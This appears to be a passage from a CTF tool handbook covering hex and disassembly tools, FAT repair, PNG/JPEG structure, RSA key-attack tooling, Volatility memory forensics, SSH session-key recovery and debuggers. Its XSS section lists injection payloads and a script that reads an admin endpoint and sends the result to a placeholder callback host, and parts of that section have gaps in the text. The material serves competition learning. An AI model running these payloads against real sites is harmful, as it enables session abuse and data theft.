' | llvm-mc \ --triple=x86_64-pc-linux-gnu --x86-asm-syntax=intel --show-encodingUse encoding output to check the bytes seen in a disassembler or to understand a small local patch. Replacing instructions also requires respecting their original total length and surrounding control flow.
CTF: decode several candidate byte sequences printf '0x31 0xc0 0xc3
' | llvm-mc \ --triple=x86_64-pc-linux-gnu --disassemble --output-asm-variant=1This decodes xor eax,eax; ret in the specified mode. A valid decoding does not establish that those bytes execute in the target.
CTF: translate syntax for reading # AT&T input by default, Intel display variant for x86 output printf 'movl $42, %%eax
retq
' | llvm-mc \ --triple=x86_64-pc-linux-gnu --output-asm-variant=1The doubled %% belongs to shell printf, which emits a literal %. Assembly source files would use %eax directly.
Cross-architecture workflow Identify architecture, bitness and endianness from the artifact. Check that llvm-mc --version lists an appropriate target. Assemble/decode a short known instruction first. Inspect only a bounded suspect sequence. Move to Ghidra or a supported debugger for control/data flow. Common failure causes Symptom Likely check Unknown instruction Wrong syntax, target or missing CPU feature Unexpected disassembly Wrong bitness/endianness or decoding data Object bytes include extra headers Object output is not a raw shellcode blob Address-relative instruction differs Relocation/link context Reference: LLVM llvm-mc manual.
Related playbooks Architecture and static analysis Byte transforms

title: xxd
content:
Use for: hex dumps, byte offsets, hex decoding and small binary edits.
Run in: WSL; supplied with Vim tooling.
Inspect a file header or region xxd -l 64 challenge.bin # First 64 bytes xxd -s 0x100 -l 64 challenge.bin # Region at hex offset 0x100 xxd -g 1 challenge.bin # One byte per group xxd -e -g 4 -l 64 challenge.bin # Display little-endian 32-bit groupsConvert bytes ↔ plain hex xxd -p challenge.bin > plain_hex.txt xxd -r -p plain_hex.txt > restored.bin # Decode a short known hex string printf '666c61677b64656d6f7d' | xxd -r -pMake a C-style byte array xxd -i challenge.bin > challenge_array.hCTF: patch a working copy cp challenge.bin patched.bin # Write one 0x90 byte at offset 0x20 in the copy printf '00000020: 90\n' | xxd -r - patched.bin # Confirm the modified region xxd -s 0x20 -l 16 patched.binGotchas Normal dump offsets are hex; do not confuse 0x20 with decimal 20. A patch uses a file offset, not a process virtual address. xxd -r can silently ignore text that is not valid dump data; confirm the resulting bytes. Use -r -p for plain hex and -r for an addressed xxd dump. Flags explained Flag Meaning -l N Read at most N input bytes -s OFFSET Start at an input byte offset -g N Group N bytes together in the display -e Show groups in little-endian word order -p Produce plain hex without addresses/ASCII columns -r Reverse a hex dump into bytes -r -p Decode plain hex text -i Produce a C include-style byte array -c N Set bytes per output line -r means reverse conversion here. It does not mean recursive or read-PCAP.
CTF: read a size field # Four bytes at an example offset, displayed without ambiguity xxd -s 0x10 -l 4 -g 1 challenge.binIf those bytes are 78 56 34 12, the little-endian integer is 0x12345678. For arithmetic, parse them with Python rather than reversing text by eye.
from pathlib import Path data = Path("challenge.bin").read_bytes() field = data[0x10:0x14] assert len(field) == 4 print("little:", int.from_bytes(field, "little")) print("big:", int.from_bytes(field, "big"))CTF: compare headers or patched bytes xxd -g 1 -l 128 original.bin > original_header.txt xxd -g 1 -l 128 modified.bin > modified_header.txt diff -u original_header.txt modified_header.txtA repaired header may reveal additional damage later in the file. Check the actual format parser after patching.
CTF: inspect the end of a file # Negative offset relative to EOF: inspect the final 64 bytes xxd -s -64 challenge.binUseful for trailers, archive records and appended messages. A fixed trailer signature can occur inside ordinary payload bytes; validate its placement.
CTF: build a raw byte fixture printf '89504e470d0a1a0a' | xxd -r -p > png_signature.bin xxd -g 1 png_signature.binThis creates only an eight-byte signature, not a valid PNG. It is useful for comparing a suspected damaged header or testing your own parser’s signature check.
Reference: xxd manual.
Related playbooks Binary strings and encodings Bounded file carving

title: fsck.fat (dosfstools)
content:
Use for: diagnosing or repairing a FAT filesystem image.
Run in: WSL. Despite the tournament category, this is a filesystem tool.
Diagnose without changes # Use a FAT filesystem image, not an entire partitioned disk fsck.fat -n -v fat.img # Also list processed paths fsck.fat -n -l fat.img-n performs a noninteractive check without writing. Keep this option for initial triage.
Walkthrough: damaged FAT challenge Identify whether the artifact contains a partition table with mmls. If partitioned, extract the FAT partition first. Run the read-only check and save the diagnosis. Use Sleuth Kit to inspect recoverable entries. If repair is needed, do it on a copy and compare recovery results. # Example partition boundaries only: use values from YOUR image dd if=disk.img of=fat.img bs=512 skip=2048 count=65536 status=none fsck.fat -n -v fat.img > fat_check.txt 2>&1 # Repair the copy interactively cp fat.img fat_work.img fsck.fat -r fat_work.imgGotchas Repair can change directory entries, cluster chains and deleted evidence. Confirm sector size before using dd; 512 is only this example’s assumption. Do not run against a mounted filesystem or unrelated host drive. For file recovery, continue with The Sleuth Kit or Autopsy. Flags explained Flag Meaning -n Check without writing changes; noninteractive -v Show verbose diagnostic information -l List paths while processing -r Repair interactively; can modify the filesystem -r means repair here, not recursive traversal. For a forensic artifact, run read-only diagnosis first and repair only a working copy.
Understand the supporting dd options dd if=disk.img of=fat.img bs=512 skip=2048 count=65536 status=none Argument Meaning if= Input file of= Output file; existing content can be overwritten bs=512 Use 512-byte blocks skip=2048 Skip 2048 input blocks count=65536 Copy at most 65536 blocks status=none Suppress ordinary status output The example start byte is 512 * 2048, not 2048 bytes. Use the actual sector size and partition boundaries.
CTF: preserve before/after evidence sha256sum fat.img > original_hash.txt cp fat.img fat_work.img fsck.fat -n -v fat_work.img > before_check.txt 2>&1 fsck.fat -r fat_work.img fsck.fat -n -v fat_work.img > after_check.txt 2>&1 sha256sum fat_work.img > repaired_hash.txtThe hash difference shows the copy changed; it does not establish which recovered bytes are original evidence. Keep recovery results from before repair too.
Interpret common filesystem findings Finding Investigation consequence Lost/unreferenced cluster chain Possible recoverable content; structure may be unclear Invalid chain or cross-linked clusters File contents may overlap or be incomplete FAT copies disagree Determine which structural interpretation is supported Unexpected size/boot metadata Wrong partition boundary or damaged metadata When to stop repairing If the objective is recovering a specific file and Sleuth Kit can already extract a valid copy, further repairs can add ambiguity. Save the recovered file, its source record and the read-only diagnosis. Repair is useful when it unlocks a necessary next step, not as a required action for every FAT image.
Reference: dosfstools fsck.fat manual.
Related playbooks Preserve and inspect artifacts Bounded carving

title: PNG & JPEG Structure
content:
PNG and JPEG container clues Separate container bytes, metadata and decoded samples. Each offers a different hiding place.
1. PNG chunk layout 8-byte PNG signature repeated: 4-byte big-endian data length 4-byte ASCII chunk type N bytes of data 4-byte CRC over type + data Chunk What to inspect IHDR Width, height, bit depth, color type, interlace PLTE Palette entries; index patterns may be meaningful IDAT Parts of the compressed image datastream, not plaintext pixel rows tEXt, zTXt, iTXt Textual metadata, sometimes compressed tRNS Transparency information for relevant color types IEND End of the PNG datastream Unknown ancillary chunk Inspect type, length, contents and CRC; unknown does not automatically mean malicious PNG compression and per-row filters must be decoded before interpreting pixel LSB. The PNG specification defines chunk CRCs, image filtering and datastream boundaries.
2. Bounded chunk/CRC inspection Standard-library parser; it does not repair or overwrite the source:
from pathlib import Path import struct import zlib data = Path("image.png").read_bytes() if data[:8] != b"\x89PNG\r\n\x1a\n": raise ValueError("wrong PNG signature") pos = 8 while pos + 12 <= len(data): length = struct.unpack_from(">I", data, pos)[0] end = pos + 12 + length if end > len(data): raise ValueError(f"truncated chunk at {pos:#x}") kind = data[pos+4:pos+8] body = data[pos+8:pos+8+length] stored = struct.unpack_from(">I", data, pos+8+length)[0] actual = zlib.crc32(kind + body) & 0xffffffff print(hex(pos), repr(kind), length, "CRC_OK" if stored == actual else "CRC_BAD") pos = end if kind == b"IEND": if length != 0: raise ValueError("invalid nonempty IEND") print("end", hex(pos), "trailing bytes", len(data)-pos) break else: raise ValueError("no complete IEND found")This reports structural boundaries; it is not a full PNG conformance checker. A CRC failure tells you bytes differ from the declared checksum, not which bytes should be changed.
3. Appended data after IEND Take the parser’s printed end offset, then inspect/carve exactly that range:
python3 file_carver.py scan image.png python3 file_carver.py extract image.png trailer.bin --offset 0x1234 --to-eof xxd -l 64 trailer.bin0x1234 is a placeholder, not a universal PNG endpoint. A PNG with trailing ZIP bytes may still display normally. Validate the ZIP independently; compressed image bytes can accidentally contain short signature matches.
4. PNG dimensions and intentional corruption Unusual dimensions, truncated display or a bad IHDR CRC can be challenge clues. Inspect IHDR and compare expected decompressed row lengths before editing. Changing width/height affects scanline interpretation and can produce deceptive partial images.
Make a new copy for experiments. If you alter chunk data, recompute that chunk’s CRC over its type plus data. Merely changing the CRC to match corrupted dimensions does not prove the repaired image reflects the intended hidden content.
5. JPEG: different representation SOI ff d8 → marker segments / scan headers → compressed scan data → EOI ff d9JPEG may include comments, EXIF, XMP, thumbnails and multiple scan segments. Entropy-coded scan data uses byte stuffing and restart markers; a naive “every ff begins a length-prefixed segment” parser is wrong inside a scan.
First inspect:
exiftool -a -u -g1 image.jpg strings -a -n 6 -t x image.jpg binwalk image.jpgUse the actual JPEG endpoint from a structure-aware inspection. The first ff d9 byte pair found anywhere can occur inside an embedded thumbnail or segment payload, so it is not a universal trailer boundary.
6. Pixel LSB versus coefficient steganography Method Carrier Practical consequence PNG/BMP pixel LSB Decoded integer sample bits zsteg/Pillow bit extraction may work JPEG coefficient hiding Quantized transform coefficients RGB pixels from Pillow do not expose the same bits JPEG metadata/trailer Container bytes ExifTool, hex tools and precise carving can work Spatial LSB then saved as JPEG Original sample bits altered by lossy coding Exact original bit recovery may be impossible Do not convert JPEG to PNG and expect it to restore original pre-compression LSBs. Likewise, zsteg is not a universal JPEG coefficient extractor. If the event’s approved toolbox lacks a dedicated coefficient decoder, first exhaust metadata, trailers and source/clue-directed formats; do not claim absence of a hidden coefficient payload from a failed pixel scan.
7. Alpha, palettes and animations Transparency may hide visible RGB values, or alpha itself may carry a bit plane. Palette indexes may encode a message even when palette colors look normal. Animated formats may place fragments across frames; record frame index and disposal/compositing behavior when extracting.
Different decoders may return composited frames instead of raw frame rectangles. Record the library/tool and frame handling used to reproduce your result.
Tools: ExifTool, HxD, xxd, binwalk.
Next: bit-plane extraction, bounded carving.

title: RsaCtfTool
content:
Use for: weak RSA keys, known RSA attack patterns and private key recovery.
Run in: WSL; Python based tool.
Check the entry point first # Current upstream CLI RsaCtfTool --help # Older supplied checkouts may instead use: # python3 /path/to/RsaCtfTool.py --helpUse the installed version’s help. Recent upstream uses --decryptfile; older examples often use --uncipherfile.
Inspect a public key RsaCtfTool --dumpkey --key public.pem openssl pkey -pubin -in public.pem -text -nooutTry a relevant attack # General weak-key recovery RsaCtfTool --publickey public.pem --private # Small private exponent candidate RsaCtfTool --publickey public.pem --attack wiener --private # Multiple supplied public keys RsaCtfTool --publickey '*.pub' --privateDecrypt challenge ciphertext RsaCtfTool --publickey public.pem --decryptfile ciphertext.binConfirm whether the challenge ciphertext is raw bytes, hex, Base64 or an integer before supplying it.
CTF notes Record n, e, ciphertext and any leaked factors/CRT values. Select an attack from the evidence rather than waiting indefinitely on all methods. Ordinary large RSA keys are not automatically breakable. Some attacks require optional dependencies or online services; availability and competition approval must be checked separately. Verify recovered plaintext bytes and padding; textbook RSA and OAEP differ. Flags explained Flag Meaning --publickey FILE Select the target public key / supported key pattern --private Request recovered private key output --attack NAME Select a named supported attack --decryptfile FILE Read ciphertext bytes for decryption in current upstream --dumpkey Display key parameters --key FILE Supply the key inspected by dump/reconstruction modes --createpub Construct a public key using numeric parameters -n NUMBER RSA modulus n -e NUMBER RSA public exponent e -e means exponent here, while binwalk uses it for extraction. Confirm names with --help, especially on older supplied checkouts.
Match the RSA weakness before selecting an attack Given clue Candidate technique Necessary check Two public keys share a prime GCD between moduli 1 < gcd(n1,n2) < n1 p and q very close Fermat factorization Difference must be small enough Unusually small private exponent Wiener Check recovered factors/private key Tiny e, short unpadded plaintext Exact integer root The plaintext power must not wrap modulo n Same message, small e, several moduli Broadcast attack Enough compatible ciphertexts/moduli Leaked p/q/d/CRT values Reconstruct key Confirm p*q == n and valid exponents Normal large random modulus No obvious weakness Search the challenge for leakage/implementation errors CTF: shared-prime recovery without extra packages from math import gcd # Worked example: both moduli share 61 n1, n2 = 3233, 2867 p = gcd(n1, n2) assert 1 < p < n1 q = n1 // p assert p * q == n1 print("factors:", p, q)For many keys, inspect the supplied tool’s multi-key mode first. A GCD equal to the modulus can mean duplicate keys rather than a useful partial factor.
Build a public key from decimal n and e # Tiny worked values for syntax; use your challenge's full integers RsaCtfTool --createpub -n 3233 -e 17 > example_public.pemConfirm the file contains only a PEM block before using it. Some versions print diagnostics separately or use a different output option.
Try close-prime factorization # Use this only if the installed help lists the fermat attack RsaCtfTool --publickey public.pem --attack fermat --privateA Fermat failure does not eliminate every RSA weakness. Decide the next technique from the challenge’s parameters and leaks.
Convert a ciphertext integer to bytes from pathlib import Path c = int(Path("cipher_integer.txt").read_text().strip(), 10) raw = c.to_bytes(max(1, (c.bit_length() + 7) // 8), "big") Path("ciphertext.bin").write_bytes(raw)For fixed-width RSA blocks, use (n.bit_length() + 7) // 8 as the width instead. If the input is hex text, use int(text, 16); do not treat it as decimal.
Check recovered textbook plaintext assert p * q == n d = pow(e, -1, (p - 1) * (q - 1)) m = pow(c, d, n) assert pow(m, e, n) == c % n print(m.to_bytes(max(1, (m.bit_length() + 7) // 8), "big"))Here p, q, n, e and c are the actual recovered/supplied integers. Verify the key mathematically before blaming text decoding.
Keep attack dependencies separate The approved tool may have attacks requiring SageMath or external factorization helpers. Its presence in a menu does not show the helper is installed. Record “dependency missing” separately from “attack ran and failed.” Online factor databases also depend on tournament network access.
References: RsaCtfTool current CLI and examples, Python integer operations.
Related playbooks Crypto and obfuscation recognition Python and crypto reference map

title: XSS · Context Before Payload
content: Cross-site scripting Order: marker → locate exact output context → harmless execution proof → bot/admin workflow → read the challenge data. Reflection in JSON or escaped HTML alone is not XSS. 1. Map source and sink Submit a unique marker such as CTF_MARK_731. Search raw HTML, response headers, JS bundles and the live DOM. For stored input, revisit list/detail/moderation/export views. For DOM input, inspect location.search, location.hash, postMessage, storage and JSON fetch responses. Sink/context First question HTML text Are < and > parsed or encoded? Quoted attribute Can the matching quote end the value? Unquoted attribute Can a space create a new attribute? JS string Which quote, escaping and surrounding expression? URL value Is the URL scheme controlled and navigation triggered? innerHTML / insertAdjacentHTML Does the browser create active HTML? textContent Normally text, not markup execution eval, Function, string timer Is input actually evaluated as JavaScript? Inspect DOM as well as source: browser HTML parsing can move, normalize or discard malformed markup. 2. HTML text: first proof CTF_MARK_731 If output uses single quotes: ' autofocus onfocus=alert(731) x=' '>For an unquoted value, a whitespace separator can introduce an attribute: x autofocus onfocus=alert(731)autofocus depends on browser behavior, focus state and element support. A new image error is often a clearer probe. Quote encodings such as " inside an existing attribute value do not normally terminate that attribute: the tokenizer does not reparse decoded quotes as structure. 4. JavaScript contexts For exactly const name = 'INPUT'; inside an inline script: ';alert(731);// For exactly const name = "INPUT";: ";alert(731);// If untrusted input lands inside an HTML That closing-tag route does not apply to external JS files or JSON served as application/json. In a JavaScript template literal, an unescaped interpolation may evaluate: ${alert(731)}Backslash count matters. Read the final response bytes, not just your submitted input. A broken script without controlled execution is a syntax error, not a successful proof. 5. URL and DOM sources Where an actual navigated href accepts arbitrary schemes: javascript:alert(731)This generally requires activation; it is not a generic payload for . A bot may never click links. Protocol validation and CSP can block it. A typical DOM chain to recognize in client source: const q = new URLSearchParams(location.search).get('q'); document.querySelector('#result').innerHTML = q;Use ?q=%3Cimg%20src%3Dx%20onerror%3Dalert(731)%3E for that sink. A hash source may decode differently; fragments are visible to client JS and are not sent in HTTP requests. document.write, outerHTML, jQuery HTML constructors and third-party template renderers need separate context checks. 6. Stored XSS / admin bot: complete the chain Determine exactly which URL the bot visits and whether it opens submitted links or a fixed moderation page. Store a proof that triggers without a click if the bot does not interact. Use the bot’s same-origin privileges to read a documented challenge endpoint. Send only the intended challenge result to a permitted callback if event rules allow it. A payload body for a confirmed JavaScript sink: fetch('/admin/flag', {credentials:'same-origin'}) .then(r => r.text()) .then(t => fetch('https://YOUR-LAB-HOST/collect', { method:'POST', mode:'no-cors', body:t }));Place that body in the proven execution context, not blindly in every HTML tag. HttpOnly prevents reading a cookie through document.cookie; it does not stop same-origin requests carrying the cookie. An admin token may instead be in storage or a request header. Cross-origin reading still follows CORS. no-cors produces an opaque response; it does not let JS read an arbitrary origin. A CSP connect-src restriction can block the callback. A callback log proves some browser reached you; a unique route/token and returned content are needed to tie it to the bot. 7. CSP and sanitization troubleshooting Observation Check next Tags show literally HTML encoding or text sink; locate another render path Image inserted but handler missing Sanitizer removes event attributes Handler present but no execution Browser console CSP / sandbox errors failed” is not a useful diagnosis without its sink. Related: SSTI for server evaluation; CSRF/CORS for requests made from another origin. Tool workflow Use Burp Community Repeater for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof. References MDN XSS, MDN innerHTML security considerations, CSP script-src.

title: Volatility 3
content:
Use for: processes, command lines, network state and files in memory dumps.
Run in: WSL. Examples use python3 vol.py from the installed checkout; a packaged installation may provide vol instead.
Discover plugins and identify Windows memory python3 vol.py -h python3 vol.py -f /path/to/memory.raw windows.infoGlobal options such as -f, -o, -r, -p, and -s go before the plugin name. Use absolute artifact paths if running from the tool directory.
Windows CTF triage # Active processes and parent relationships python3 vol.py -f /path/to/memory.raw windows.pslist python3 vol.py -f /path/to/memory.raw windows.pstree # Scan for process objects and inspect command lines python3 vol.py -f /path/to/memory.raw windows.psscan python3 vol.py -f /path/to/memory.raw windows.cmdline # Network objects and file objects python3 vol.py -f /path/to/memory.raw windows.netscan python3 vol.py -f /path/to/memory.raw windows.filescanExtract files associated with a process mkdir -p /tmp/vol_out # Replace 1234 with the PID found during triage python3 vol.py -f /path/to/memory.raw -o /tmp/vol_out \ windows.dumpfiles --pid 1234Export structured output python3 vol.py -f /path/to/memory.raw -r json windows.pslist > processes.jsonLinux memory python3 vol.py -f /path/to/linux.raw banners python3 vol.py -f /path/to/linux.raw linux.pslist python3 vol.py -f /path/to/linux.raw linux.pstreeLinux plugins require matching kernel symbols. Windows symbols can also need an available symbol cache or download access.
Gotchas Plugin names/options vary; inspect PLUGIN -h on the supplied build. Volatility 2 profiles and commands are different from Volatility 3. Empty results can reflect unsupported symbols or missing pages. Flags explained: global versus plugin options Flag Meaning Position -f FILE Input memory image Before plugin name -o DIR Output directory for files emitted by a plugin Before plugin name -r json Select JSON result renderer Before plugin name -p DIR Additional plugin search directory Before plugin name -s DIR Additional symbol search directory Before plugin name -h Framework or selected plugin help Use at the relevant level --pid N Select a process, when the plugin supports it After plugin name --dump Ask a supporting plugin to write memory/files After plugin name --key PATH Select registry key for printkey After plugin name The same -r means result renderer in Volatility and input capture in TShark.
CTF: investigate a suspicious process # Process identity, parentage, command line and libraries python3 vol.py -f /path/to/memory.raw windows.pstree python3 vol.py -f /path/to/memory.raw windows.cmdline --pid 1234 python3 vol.py -f /path/to/memory.raw windows.dlllist --pid 1234 # Inspect the available memmap options, then dump mapped memory python3 vol.py windows.memmap -h python3 vol.py -f /path/to/memory.raw -o /tmp/vol_out \ windows.memmap --pid 1234 --dumpUse the PID from your image. A process name is not unique identity; check creation time, parent, path and associated activity.
CTF: search the emitted process memory # Replace the filename with the actual dump name reported by memmap strings -a -t x /tmp/vol_out/pid.1234.dmp > process_ascii.txt strings -a -e l -t x /tmp/vol_out/pid.1234.dmp > process_wide.txt grep -niE 'flag|password|secret|https?://' process_ascii.txt process_wide.txtA dump-file offset is not automatically the original virtual address. Keep memmap’s mapping output for correlation.
CTF: registry autorun clues python3 vol.py -f /path/to/memory.raw windows.registry.hivelist python3 vol.py -f /path/to/memory.raw windows.registry.printkey \ --key 'Software\Microsoft\Windows\CurrentVersion\Run'Inspect the plugin’s help to select a specific hive when necessary. A key can be absent from some hives or unavailable memory pages. Preserve the hive path and value data in your notes.
CTF: scan for file objects, then recover a candidate python3 vol.py -f /path/to/memory.raw windows.filescan > filescan.txt grep -niE 'flag|secret|\.txt|\.zip' filescan.txt python3 vol.py windows.dumpfiles -hUse the plugin’s --virtaddr or --physaddr only after verifying which address type your source plugin returned. A wrong address kind can produce empty output without disproving that the file existed.
Build a compact memory timeline Join process start/exit times, command lines, network observations and recovered file content. Treat a scanned process object as possible historical evidence; psscan and active-list enumeration answer different questions.
Troubleshooting symbol and plugin failures Error/outcome Distinguish Unsatisfied kernel/symbol requirement Missing or mismatched symbols versus malformed image Plugin not listed Search path/import/API compatibility Empty dump directory Plugin did not emit bytes versus wrong output location Process absent from pslist Exited process, corruption or wrong image interpretation Extracted file incomplete Missing resident pages/cache state References: Windows tutorial, Linux tutorial, dumpfiles, memmap, registry printkey.
Related playbooks Runtime evidence and memory TLS/SSH secrets versus metadata

title: OpenSSH-Session-Key-Recovery
content:
Use for: recovering SSH cipher keys and IVs from a Linux memory image.
Run in: the supplied Volatility 3 installation in WSL. This entry is a plugin, not an independent CLI.
Required inputs Linux memory containing the relevant OpenSSH process/session state. Matching Linux kernel symbols for Volatility. Plugin openssh_sessionkeys.py and its openssh32/openssh64 symbol files. A matching PCAP if the challenge also requires traffic decryption. Discover the installed plugin # From the supplied Volatility directory python3 vol.py -h | grep -i ssh python3 vol.py -f /path/to/linux.raw linux.pslistRecover keys from sshd # For a plugin integrated under the linux namespace python3 vol.py -f /path/to/linux.raw \ linux.openssh_sessionkeys.SSHKeys --name sshd --out /tmp/ssh_keys.jsonlUse the exact name listed in -h. An externally loaded plugin may appear as openssh_sessionkeys.SSHKeys instead.
External plugin/symbol directories # Discover names using the organizer's actual plugin and symbol paths python3 vol.py -p /path/to/plugins -s /path/to/symbols -h # Then use the reported name and the same -p/-s global options--pid 1234 can select a specific process instead of --name sshd. The upstream plugin writes one JSON object per line with --out.
Interpret the result Record the cipher name, key, IV, PID and session context. These are session encryption values, not the user’s login password. Recovering keys is only one stage; traffic decryption also needs correct direction, cipher/framing and capture context. Standard TLS key-log settings do not decrypt SSH.
Compatibility depends on the supplied plugin, Volatility API and OpenSSH structures.
Flags explained Flag Meaning -f IMAGE Volatility input memory image -p DIR Additional Volatility plugin search path -s DIR Additional symbol search path --name sshd This plugin’s process-name selector --pid N This plugin’s PID selector --out FILE This plugin’s JSON Lines output file -h Discover framework/plugin options --out belongs to this plugin. Volatility’s global -o DIR selects a directory for plugins that use its file-output interface; it is not interchangeable with this plugin’s filename argument.
CTF: establish that the prerequisites are satisfied Identify the memory image and Linux kernel banner. Run linux.pslist successfully with matching kernel symbols. Find the relevant sshd process/PID. Confirm the SSH plugin appears in Volatility help. Confirm the required OpenSSH structure symbols are available. Run the plugin against a selected process and preserve complete output. Do not treat a plugin import failure as evidence that no session keys remain in memory.
CTF: inspect a selected process python3 vol.py -f /path/to/linux.raw linux.pslist python3 vol.py linux.openssh_sessionkeys.SSHKeys -h python3 vol.py -f /path/to/linux.raw \ linux.openssh_sessionkeys.SSHKeys --pid 1234 --out /tmp/pid1234_keys.jsonlReplace the name with the installed plugin identifier and PID with the image’s relevant process. Upstream filtering expects a PID/name selection to choose processes; use an explicit selector.
CTF: inspect recovered records with jq jq -c '{task_name, cipher_name, key, iv}' /tmp/pid1234_keys.jsonl jq -r '[.cipher_name, .key, .iv] | @tsv' /tmp/pid1234_keys.jsonlThe key and IV values are hex text representing bytes. Count decoded bytes with Python if needed; the correct size depends on the negotiated cipher.
Correlate keys with the captured SSH session Use the process/time context, endpoint pair and negotiated algorithm from the PCAP. A host can have multiple SSH sessions and keys for different directions or rekey intervals. A candidate structure is useful only when it matches the session being reconstructed.
Why a recovered key may not directly decode the PCAP SSH has packet framing, authentication, sequence numbers and potentially rekeying. Cipher suites have different key/nonce/state requirements. This repository’s recovery plugin is not a universal PCAP decryption command. Use an organizer-supplied compatible decryptor if provided, or implement the documented session format with the exact captured context.
Failure categories Failure Meaning to investigate Plugin absent from help Search path/import or compatibility Kernel requirement unsatisfied Memory/symbol layer setup OpenSSH symbol lookup fails Plugin-specific symbols/path No selected tasks Wrong PID/name or process no longer present No keys in a valid selected task Missing pages, freed state or unsupported structures Keys found but bytes remain wrong Session/direction/cipher/framing/rekey context References: project setup, plugin options and output.
Related playbooks TLS/SSH evidence workflow

title: x64dbg
content:
Use for: native Windows executable debugging, comparisons and runtime decoding.
Run in: Windows portable build. Use x64dbg for 64-bit, x32dbg for 32-bit targets.
Launch with a target # Run from the extracted debugger folder; adjust the actual location .\x64dbg.exe 'C:\CTF\challenge.exe'Useful controls Action Default key Open executable F3 Run / continue F9 Toggle breakpoint at selection F2 Step into F7 Step over F8 Execute until return Ctrl+F9 Restart Ctrl+F2 Walkthrough: find the check Open the executable and run to its relevant code. In the CPU disassembly, search the current module for string references. Find the failure/success message and follow its references. Set a breakpoint near the input comparison and run with a test value. Inspect registers, stack and pointed-to memory. Follow decoded strings or buffers in the dump view. Record the transformation and reproduce it in Python. Debugger command bar examples bp kernel32.GetProcAddress bp kernel32.LoadLibraryAThese help locate dynamically resolved APIs when the relevant exports are loaded and resolvable.
Gotchas Windows x64 integer/pointer arguments normally begin in RCX, RDX, R8 and R9. Linux gdb examples often use a different ABI. A patched success branch may skip flag generation; recover the actual input/algorithm. ASLR changes runtime addresses; keep module-relative offsets. CTF: break on a comparison or decoded buffer Find the validation function through a message reference or call trace. Stop immediately before its compare routine. Identify argument buffers using the correct calling convention. Follow each pointer in Dump and inspect both hex and text. Step across the comparison and inspect the return value/conditional branch. Trace how the expected buffer was constructed, then recover the real input. On Windows x64, memcmp(a,b,n) normally receives a in RCX, b in RDX and n in R8. A 32-bit target commonly passes arguments on the stack, but optimized/internal functions can differ.
Debugger commands explained bp kernel32.GetProcAddress bp kernel32.LoadLibraryAbp/bpx sets a software breakpoint at an address or resolvable symbol. kernel32.GetProcAddress selects an exported API by module and name. The module must be loaded and the symbol must resolve; forwarded APIs can lead into another module.
At a GetProcAddress breakpoint on x64, inspect RDX as a possible function-name pointer or ordinal value. Do not interpret a small ordinal as a valid string address.
CTF: distinguish runtime addresses from patch offsets Record a code location as module name plus relative virtual address (RVA). To patch the file, map that RVA to its PE section’s raw-file offset. ASLR affects the loaded base, and section virtual/raw positions can differ.
CTF: watch a small decrypted value Select a known memory location in Dump and use the breakpoint menu for a hardware write/access breakpoint when appropriate. Continue until the watched value is touched. Hardware slots and supported sizes are limited; watching an entire large heap buffer this way is not practical.
CTF: export a decoded region After the decoding routine returns, confirm the buffer pointer and length. Select that region in Dump and use its binary save control. Verify the first bytes and length in HxD. A pointer followed by a NUL does not necessarily mark the full output buffer length.
Exceptions and unpacking clues An exception can be deliberate control flow. Record its address/code and whether the program’s own handler continues normally. For a packed executable, follow the transition into newly decoded executable memory and rebuild your understanding from the actual code reached.
End-to-end investigation example Artifact: Windows PE password checker Anchor: "Wrong password" string reference Stop: comparison call before failure branch Inspect: input pointer, expected pointer, compared length Trace: XOR loop building the expected bytes Recover: reverse loop in Python Prove: enter recovered value in the unpatched applicationCommon debugger mistakes Symptom Check Breakpoint belongs to another process/module Target identity and module mapping Wrong string at RCX ABI, pointer lifetime and exact stop position Patch works but no flag Required computation was skipped Data changes each run Random seed, timestamps or session input Stepping enters long library code Use step over or a breakpoint after the call References: GUI manual, bp command.
Related playbooks Native runtime debugging Native binary triage

title: Autopsy
content:
Use for: disk image browsing, deleted files, browser history and timelines.
Run in: Windows GUI. Uses The Sleuth Kit and additional ingest modules.
Walkthrough: investigate a disk image New Case → choose a case name and a separate output directory. Add Data Source → Disk Image or VM File → select the artifact. Set the source timezone from the challenge information. Select relevant ingest modules and start processing. Browse Data Sources, Views, and Results as results appear. Search the expected flag prefix and challenge keywords. Export useful files with Extract File(s) and record their source paths. Where to look Question Useful view/module What was deleted? Deleted file entries / filesystem views What did the user browse? Recent Activity / web artifacts Is a file extension misleading? File Type Identification / Extension Mismatch What happened at a given time? Timeline Is there hidden text or a named secret? Keyword Search Is an archive/document carrying another file? Embedded File Extraction Fast CTF workflow Start with likely user folders, downloads and deleted entries. Add focused searches while ingest runs. Correlate a hit with its full path, timestamps and neighboring artifacts.
Gotchas Some results appear only after the relevant ingest module completes. A keyword hit can come from metadata or an unrelated context. Preserve the original image and export recovered files separately. Use the tournament’s permitted modules; do not add AI/ML components. For CLI recovery see The Sleuth Kit.
CTF: recover a deleted document Identify the likely user/profile folder. Inspect deleted filesystem entries and filename searches. Preview candidates in text/hex views. Extract the file to a separate directory. Check whether it opens and whether its contents match the question. Preserve the original path, deletion state and metadata address if available. Recovery can be partial when clusters are overwritten. A recovered filename and a recovered complete file are different outcomes.
CTF: reconstruct browsing activity Use Recent Activity/web results to identify URLs, downloads and time windows. Follow a suspicious download to its filesystem artifact. Browser-history entries do not necessarily show that a user viewed all page content; correlate with other traces.
CTF: identify a disguised file Compare the filename extension with detected file type. Export a mismatch candidate and inspect its magic bytes in HxD/xxd. The extension mismatch module helps prioritize; a deliberate extension change does not itself explain the hidden content.
CTF: timeline investigation Start with a known event or narrow time window from the statement. Filter by path/artifact type, then correlate created/modified/accessed observations. Record the source timezone and whether the interface converts display times.
